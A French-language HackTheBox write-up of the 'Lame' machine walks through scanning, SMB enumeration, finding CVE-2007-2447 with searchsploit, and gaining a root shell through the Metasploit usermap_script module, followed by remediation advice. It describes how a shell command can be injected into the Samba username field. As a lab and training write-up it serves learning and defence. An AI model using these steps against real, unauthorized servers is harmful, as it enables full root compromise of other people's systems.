# Lame — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Linux (Debian) |
| **Difficulté** | Easy |
| **Date** | 2026-09-26 |
| **Vecteur** | Injection de commande via Samba (`username map script`) |
| **CVE** | CVE-2007-2447 |

---

## TL;DR

Le service **Samba 3.0.20** exposé sur le port 445 est vulnérable à **CVE-2007-2447** : lorsque l'option `username map script` est activée, le champ *username* fourni à la connexion n'est pas assaini. On y injecte une commande shell, exécutée **côté serveur en root** (Samba tourne en root) → **RCE root direct**, sans élévation de privilèges.

---

## 1. Reconnaissance

### Scan nmap de référence

```bash
nmap -sC -sV -p- -oA nmap/lame <IP>
```

Ports notables :

| Port | Service | Version |
| --- | --- | --- |
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 |
| 139 / 445 | SMB | **Samba 3.0.20-Debian** |
| 3632 | distccd | distcc v1 |

> La version **Samba 3.0.20** est la ligne à souligner : une version précise = piste d'exploit connue.

---

## 2. Énumération SMB

```bash
smbclient -L //<IP>/ -N
```

Login anonyme accepté. Partages visibles : `print$`, `tmp`, `opt`, `IPC$`, `ADMIN$`.
Le commentaire du service confirme la version : `lame server (Samba 3.0.20-Debian)`.

> L'intérêt ici n'est pas le contenu des partages mais **la version du service**.

---

## 3. Recherche de vulnérabilité

```bash
searchsploit samba 3.0.20
```

Résultat retenu :

```
Samba 3.0.20 < 3.0.25rc3 - 'Username map script' Command Execution | unix/remote/16320.rb
```

L'extension `.rb` = module Metasploit. Module correspondant :
`exploit/multi/samba/usermap_script`.

### Lecture avant lancement

```bash
searchsploit -x unix/remote/16320.rb
```

Mécanisme : le champ *username* est passé sans assainissement à un script shell côté serveur → injection de commande.

---

## 4. Exploitation

### Via Metasploit

```
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS <IP>
set LHOST tun0
run
```

Vérification de l'accès obtenu :

```bash
id
# uid=0(root) gid=0(root)
```

Shell **root** direct.

### Note — sans Metasploit (exigence OSCP)

L'exploit tient dans une seule requête SMB où le champ username contient l'injection
(`/=` suivi d'une commande). Reproductible à la main avec un client SMB Python.
*À refaire en manuel pour ancrer le mécanisme.*

---

## 5. Post-exploitation

```bash
cat /home/makis/user.txt   # flag user
cat /root/root.txt         # flag root
```

> Les flags ne sont pas publiés (règle HTB — pas de spoiler).

---

## 6. Remédiation

- **Mettre à jour Samba** vers une version corrigée (≥ 3.0.25).
- Désactiver l'option `username map script` si non nécessaire.
- Ne pas exposer SMB sur des interfaces non maîtrisées ; segmenter.
- Ne pas faire tourner le service avec le compte root (moindre privilège).

---

## 7. Leçons

- La **version d'un service** est souvent la porte d'entrée — la relever systématiquement (`-sV`).
- Distinguer les familles de failles : ici **injection de commande** (faute de logique applicative), à opposer aux corruptions mémoire (EternalBlue, MS08-067).
- Toujours **lire** un exploit avant de le lancer (`searchsploit -x`).

---

## Références

- CVE-2007-2447 — <https://nvd.nist.gov/vuln/detail/CVE-2007-2447>
- Exploit-DB 16320
- Module Metasploit : `exploit/multi/samba/usermap_script`
